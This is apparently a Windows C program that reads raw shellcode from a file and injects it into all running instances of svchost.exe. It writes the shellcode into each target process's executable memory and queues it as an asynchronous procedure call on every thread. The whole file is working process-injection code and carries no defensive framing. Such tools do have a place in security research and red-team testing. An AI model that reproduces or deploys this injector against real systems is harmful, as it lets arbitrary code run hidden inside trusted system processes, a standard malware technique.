//#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <io.h>

#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <limits.h>
#include <Windows.h>
#include <TlHelp32.h>

int get_errno(void);
#ifdef errno
#undef errno
#endif
#define errno get_errno()

int main(int argc, char **argv)
{
	DWORD OldProtect = 0;
	HANDLE target_process_handle = NULL;
	LPVOID target_process_buffer = NULL;
//	void *target_process_params_buf = NULL;
	int i;
	unsigned rv;

//---------------- Globals moved to locals
unsigned char *shellcode = NULL;
size_t shellcode_size = 0;
char shellcode_fname[256] = "shellcode1.txt";				// Default shellcode file.
char target_process_name[256] = "svchost.exe";
unsigned target_pid = 0;
int all_instances = 1;
unsigned max_processes = UINT_MAX;
unsigned max_threads = UINT_MAX;	// total, not per process

unsigned dry_run = 0;
unsigned dry_run_no_wpm = 0;

char err_buf[1024];

unsigned have_params = 0;			// have_params support
//----------------------------------------


/*
	// Parse command-line parameters
	for (i = 1; i < argc; ++i)
	{
		if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "-?"))
			goto	usage;
		else if (!strcmp(argv[i], "-p"))
		{
			if (i == argc - 1)
			{
				fprintf(stderr, "Missing target process name\n");
usage:
				fprintf(stderr, "Usage:  %s {-p target_process_name | -pid target_pid} [-a] [-max_processes NN] [-max_threads NN] [-dry_run] [-dry_run_wpm] [-s shellcode_file] [-hah]\n", argv[0]);
				fprintf(stderr, "Specifying either target_process_name or target_pid is mandatory. Default shellcode_file is 'shellcode1.txt'\n"
								"-dry_run does all preparation, but doesn't actually queue APCs to target threads\n"
								"-dry_run_no_wpn doesn't write to target process memory and doesn't queue APCs\n");
				exit(-1);
			}
			++i;
			strcpy(target_process_name, argv[i]);
		}
		else if (!strcmp(argv[i], "-s"))
		{
			if (i == argc - 1)
			{
				fprintf(stderr, "Missing shellcode file name\n");
				goto	usage;
			}
			++i;
			strcpy(shellcode_fname, argv[i]);
		}
		else if (!strcmp(argv[i], "-a"))
		{
			all_instances = 1;
		}
		else if (!strcmp(argv[i], "-dry_run"))
		{
			dry_run = 1;
		}
		else if (!strcmp(argv[i], "-dry_run_no_wpm"))
		{
			dry_run_no_wpm = 1;
			dry_run = 1;
		}

		else if (!strcmp(argv[i], "-pid"))
		{
			if (i > argc - 1 - 1)
			{
				fprintf(stderr, "Missing parameter for -pid\n");
				goto	usage;
			}
			if (sscanf(argv[++i], "%u", &target_pid) != 1)
			{
				fprintf(stderr, "Bad parameter for -pid: '%s'\n", argv[i]);
				goto	usage;
			}
		}
		else if (!strcmp(argv[i], "-max_threads"))
		{
			if (i > argc - 1 - 1)
			{
				fprintf(stderr, "Missing parameter for -max_threads\n");
				goto	usage;
			}
			if (sscanf(argv[++i], "%u", &max_threads) != 1)
			{
				fprintf(stderr, "Bad parameter for -max_threads: '%s'\n", argv[i]);
				goto	usage;
			}
		}
		else if (!strcmp(argv[i], "-max_processes"))
		{
			if (i > argc - 1 - 1)
			{
				fprintf(stderr, "Missing parameter for -max_processes\n");
				goto	usage;
			}
			if (sscanf(argv[++i], "%u", &max_processes) != 1)
			{
				fprintf(stderr, "Bad parameter for -max_processes: '%s'\n", argv[i]);
				goto	usage;
			}
		}

	}

	// target_process_name was not provided in options (-p) and target_pid was also not provided with -pid.
	if (!target_process_name[0] && !target_pid)
		goto	usage;
*/

	// Prepare shellcode
	do
	{
//		FILE *f;
		int f;
		
		printf("Preparing shellcode...\n");

		// Use shellcode from file.
//		f = fopen(shellcode_fname, "rb");
		f = _open(shellcode_fname, _O_RDONLY);
		
//		if (!f)
		if (f == -1)
		{
//			fprintf(stderr, "Can't load shellcode from '%s': %s (%d)\n", shellcode_fname, strerror(errno), errno);
			printf("Can't load shellcode from '%s': %s (%d)\n", shellcode_fname, strerror(errno), errno);
			exit(-1);
		}
		
//		fseek(f, 0, 2 /*SEEK_END*/);
		_lseek(f, 0, SEEK_END);
		
//		shellcode_size = (size_t)ftell(f);
		shellcode_size = (size_t)_tell(f);
		
//		fseek(f, 0, 0 /*SEEK_SET*/);
		_lseek(f, 0, SEEK_SET);
		
		shellcode = malloc(shellcode_size + 1 /* To have space for INT 3 */);
		
//		fread(shellcode + 1 /* To have space for INT 3 */, 1, shellcode_size, f);
		_read(f, shellcode + 1 /* To have space for INT 3 */, shellcode_size);
		
//		shellcode[0] = 0xCC; /* INT 3 */
		shellcode[0] = 0x90; /* NOP */

		printf("Loaded shellcode from '%s', shellcode_size = %u\n", shellcode_fname, (unsigned)shellcode_size);
		
//		fclose(f);
		_close(f);

		if (!have_params)
			break;

#if 0
		// Prepare shellcode params.
		param_size = 8;		// size field + type field
		params = malloc(param_size);

		*(unsigned __int32*)(params + param_size - 4) = PARAM_GENERIC;

		// Set total parameters size
		*(unsigned __int32*)(params + 0) = param_size;
#endif
	} while (0);

	printf("Will inject to process '%s'\n", target_process_name);

	// Inject APCs to possibly all instances of the process
	do
	{
		HANDLE snapshot1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		unsigned num_processes = 0, num_threads = 0;

		for (Process32First(snapshot1, &pe); Process32Next(snapshot1, &pe);)
		{
			DWORD target_process_id = pe.th32ProcessID;

			if (num_threads == max_threads)
				break;

			if (num_processes++ == max_processes)
				break;

			// Both target_process_name and target_pid have effect

			// If target_pid was specified (-pid), it must match pe.th32ProcessID
			if (target_pid && target_pid != target_process_id)
				continue;

			// If target_pid was specified and matched, process even if target_process_name doesn't match (particularly when it's "" - wasn't specified by -p)
			// If both -p and -pid were specified, both are injected: particular target_pid and all instances of target_process_name, regardless if they overlap.
			if (!strcmp(pe.szExeFile, target_process_name) || target_pid)
			{
				printf("target process id is %d\n", target_process_id);

				// Open target process
				target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
				if (!target_process_handle)
				{
					FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), LANG_SYSTEM_DEFAULT, (LPTSTR)err_buf, sizeof(err_buf) / sizeof(char), NULL);
//					fprintf(stderr, "[stderr] Failed to open process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					printf("[stderr] Failed to open process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					continue;
				}

				// Allocate shellcode buffer in target process'es address space
				target_process_buffer = VirtualAllocEx(target_process_handle, NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE /**PAGE_READWRITE*/);
				if (!target_process_buffer)
				{
					FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), LANG_SYSTEM_DEFAULT, (LPTSTR)err_buf, sizeof(err_buf) / sizeof(char), NULL);
					//fprintf(stderr, "[stderr] Failed to allocate memory for shellcode code in process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					printf("[stderr] Failed to allocate memory for shellcode code in process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					goto	next_process;
				}

				// Write shellcode to target process
				if (!dry_run_no_wpm)
				{
					WriteProcessMemory(target_process_handle, target_process_buffer, shellcode, shellcode_size, NULL);
				}

/// We don't need to use VirtualProtectEx() because above we allocate memory with attribute PAGE_EXECUTE_READWRITE.
/// This is kept merely as documentation
/**
				// Set shellcode memory in target process as executable
				VirtualProtectEx(target_process_handle, target_process_buffer, shellcode_size, PAGE_EXECUTE_READ, &OldProtect);
*/

//
// If no need for params - the case currently
//

#if 0
				// Write shellcode parameters block to target process address space
				// (!) Parameters block is shared for *all* shellcodes in the same address space (process), as well as shellcode itself.
				// So it may be used (have reserved space) for inter-thread communication by APCs and started threads on target process.

				target_process_params_buf = VirtualAllocEx(target_process_handle, NULL, param_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
				if (!target_process_params_buf)
				{
					FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), LANG_SYSTEM_DEFAULT, (LPTSTR)err_buf, sizeof(err_buf) / sizeof(char), NULL);
//					fprintf(stderr, "[stderr] Failed to allocate memory for shellcode code in process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					printf("[stderr] Failed to allocate memory for shellcode code in process %lu. Error (%08X): %s\n", target_process_id, GetLastError(), err_buf);
					goto	next_process;
				}

				if (!dry_run_no_wpm)
				{
					WriteProcessMemory(target_process_handle, target_process_params_buf, params, param_size, NULL);
				}

#endif // 0

				// Pass through all threads that have owner process target_process_id and inject into them if specified
				// This takes time to snapshot all threads in the system for every process, but it's more accurate - we will not be trying to open threads that might have been
				// terminated during our iterations.
				do
				{
					HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
					THREADENTRY32 te;
					te.dwSize = sizeof(THREADENTRY32);

					for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);)
					{
						if (te.th32OwnerProcessID == target_process_id)
						{
							HANDLE target_thread_handle = NULL;

							target_thread_handle = OpenThread(THREAD_ALL_ACCESS, 0, te.th32ThreadID);

							if (target_thread_handle)
							{
								if (!dry_run)
								{
									printf("	Queue an APC to thread id %d, target_process_params_buf = %p, param_size = %u\n",
												te.th32ThreadID, (void*)0 /*target_process_params_buf*/, 0 /*param_size*/);

									QueueUserAPC((PAPCFUNC)target_process_buffer, target_thread_handle, /*target_process_params_buf*/ 0);
								}
								else
								{
									printf("	dry_run: Would queue an APC to thread id %d, target_process_params_buf = %p, param_size = %u\n",
												te.th32ThreadID, (void*)0 /*target_process_params_buf*/, 0 /*param_size*/);
								}

								CloseHandle(target_thread_handle);

								if (++num_threads == max_threads)
									goto	next_process;
							}
						}
					} // for all threads of the chosen process

next_process:
					CloseHandle(snapshot);
				} while (0);

				CloseHandle(target_process_handle);

				// If not specified -a, inject only to one instance, the first that happened to be iterated
				if (!all_instances)
					break;
			} // if chosen process
		} // for all processes

		CloseHandle(snapshot1);

	} while (0);

	return 0;
}
